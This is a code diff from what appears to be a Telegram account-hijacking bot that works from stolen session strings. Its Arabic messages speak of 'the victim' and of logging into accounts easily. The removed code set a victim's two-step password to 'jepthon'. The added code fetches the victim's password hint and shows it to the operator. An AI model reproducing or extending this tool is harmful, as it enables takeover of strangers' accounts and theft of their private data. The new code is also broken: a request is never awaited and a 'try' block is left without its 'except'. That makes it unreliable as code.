@@ -80,10 +80,11 @@ async def user2fa(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     
     try:
-      await X.edit_2fa('jepthon')
-      return True
-    except:
-      return False
+      result = X(functions.account.GetPasswordRequest())
+      h = (result.stringify())
+      return False, h
+   # except:
+     # return False
 
 async def demall(strses, grp):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
@@ -398,11 +399,11 @@ async def users(event):
         pass
       else:
         return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
-      i = await user2fa(strses.text)
+      i, h = await user2fa(strses.text)
       if i:
         await event.reply("الشخص لم يفعل تحقق بخطوتين يمكنك الدخول الى الحساب بكل سهوله باستخدامك الامر ( D ) \n\nشكرا لك لاستخدامك البوت.", buttons=keyboard)
       else:
-        await event.reply("للأسف الشخص مفعل التحقق بخطوتين", buttons=keyboard)
+        await event.reply(f"للأسف الشخص مفعل التحقق بخطوتين\nhint: {h}", buttons=keyboard)
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"I")))
 async def users(event):
